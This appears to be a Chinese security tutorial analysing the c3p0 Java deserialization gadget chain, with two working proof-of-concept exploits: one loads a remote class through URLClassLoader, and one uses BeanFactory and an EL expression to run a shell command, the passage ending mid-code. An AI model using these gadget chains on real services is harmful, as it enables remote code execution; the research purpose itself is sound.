## 简介
c3p0是用于创建和管理连接，利用“池”的方式复用连接减少资源开销，和其他数据源一样，也具有连接数控制、连接可靠性测试、连接泄露控制、缓存语句等功能。目前，hibernate自带的连接池就是c3p0。
## ysoserial之URLClassLoader链分析
### 利用链分析
**利用链**
    * com.sun.jndi.rmi.registry.RegistryContext->lookup
     * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
     * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
查看`com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase`类源码
实现有`Serializable`接口，且具有PropertyChangeSupport和VetoableChangeSupport对象，是的具有监听器的功能
跟进`PoolBackedDataSourceBase#writeObject`方法
会保存他的成员变量`connectionPoolDataSource`，但是如果他本身不是一个可以序列化的对象，就会先执行`indirector.indirectForm`方法之后进行序列化
跟进`indirectForm`
他会首先调用`connectionPoolDataSource`的`getReference`方法得到Reference对象，之后再使用`ReferenceIndirector.ReferenceSerialized`对象进行包装之后返回一个`IndirectlySerialized`
这里的`ReferenceSerialized`是`ReferenceIndirector`类里面的一个内置类
之后在进行反序列化的时候，跟进`PoolBackedDataSourceBase#readObject`
会调用`IndirectlySerialized#getObject`方法还原对象
这个`IndirectlySerialized`是一个接口，而`ReferenceIndirector.ReferenceSerialized`实现了这个接口，并重写了`getObject`方法
所以就是调用的这个getObject方法，跟进
虽然这里具有一个lookup，但是这里的contextName是不可控的，所以触发点不在这里
后面的return语句中调用了`ReferenceableUtils.referenceToObject`方法，跟进
他从Reference对象中取出了`classFactory`和`classFactoryLocation`属性然后进行URLClassLoader进行加载并实例化，这样一个完整的利用链就形成了
### POC编写
构造一个不可序列化的并且实现了`Referenceable`的`ConnectionPoolDataSource`对象,
其`getReference`方法返回带有恶意类位置的`Reference`对象
    import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import javax.naming.Referenceable;
    import javax.sql.ConnectionPoolDataSource;
    import javax.sql.PooledConnection;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.sql.SQLException;
    import java.sql.SQLFeatureNotSupportedException;
    import java.util.Base64;
    import java.util.logging.Logger;
    public class c3p0_POC {
        private static class ConnectionPool implements ConnectionPoolDataSource , Referenceable{
            protected String classFactory = null;
            protected String classFactoryLocation = null;
            public ConnectionPool(String classFactory,String classFactoryLocation){
                this.classFactory = classFactory;
                this.classFactoryLocation = classFactoryLocation;
            }
            @Override
            public Reference getReference() throws NamingException {
                return new Reference("ref",classFactory,classFactoryLocation);
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
        public static String serialize(Object obj) throws IOException {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(obj);
            byte[] bytes = byteArrayOutputStream.toByteArray();
            objectOutputStream.close();
            return Base64.getEncoder().encodeToString(bytes);
        }
        public static void unserialize(String exp) throws IOException, ClassNotFoundException {
            byte[] decode = Base64.getDecoder().decode(exp);
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
        }
        public static void main(String[] args) throws Exception{
            Constructor constructor = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase").getDeclaredConstructor();
            constructor.setAccessible(true);
            PoolBackedDataSourceBase obj = (PoolBackedDataSourceBase) constructor.newInstance();
            ConnectionPool connectionPool = new ConnectionPool("EvilObject","http://127.0.0.1:8888/");
            Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            field.setAccessible(true);
            field.set(obj, connectionPool);
            String serialize = serialize(obj);
            System.out.println(serialize);
            unserialize(serialize);
        }
    }
这里主要是重写那个getReference方法
成功触发计算器
## BeanFactory不出网RCE
在加载类的逻辑中，如果Reference对象的classFactoryLocation为null的时候，就不会加载远程字节码，而是直接加载本地字节码
所以我们就需要一个实现了ObjectFactory接口的，并调用他的getObjectInstance方法
在JNDI注入中，在高版本的java中出现了trustCodebaseURL的限制，导致不能远程加载字节码，但是有着[绕过高版本](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)的方法
在JNDI中如果进行looup操作的时候，会动态的加载并实例化Factory类，并且调用factory.getObjectInstance()方法获取远程对象实例，攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果
文中使用了`org.apache.naming.factory.BeanFactory`类+`javax.el.ELProcessor#eval`执行任意el表达式
### POC
    import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
    import org.apache.naming.ResourceRef;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import javax.naming.Referenceable;
    import javax.naming.StringRefAddr;
    import javax.sql.ConnectionPoolDataSource;
    import javax.sql.PooledConnection;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.sql.SQLException;
    import java.sql.SQLFeatureNotSupportedException;
    import java.util.Base64;
    import java.util.logging.Logger;
    public class c3p0_no_network {
        public static String serialize(Object obj) throws Exception {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(obj);
            byte[] expCode = byteArrayOutputStream.toByteArray();
            objectOutputStream.close();
            return Base64.getEncoder().encodeToString(expCode);
        }
        public static void unserialize(String expBase64) throws Exception {
            byte[] bytes = Base64.getDecoder().decode(expBase64);
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
        }
        private static class NotSerializable implements ConnectionPoolDataSource, Referenceable {
            private String classFactory;
            private String classFactoryLocation;
            public NotSerializable() {
                this.classFactory = "BeanFactory";
                this.classFactoryLocation = null;
            }
            public NotSerializable(String classFactory, String classFactoryLocation) {
                this.classFactory = classFactory;
                this.classFactoryLocation = classFactoryLocation;
            }
            @Override
            public Reference getReference() throws NamingException {
                ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
                //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
                ref.add(new StringRefAddr("forceString", "x=eval"));
                //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
                ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','\"open -a Calculator\"']).start()\")"));
                return ref;
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }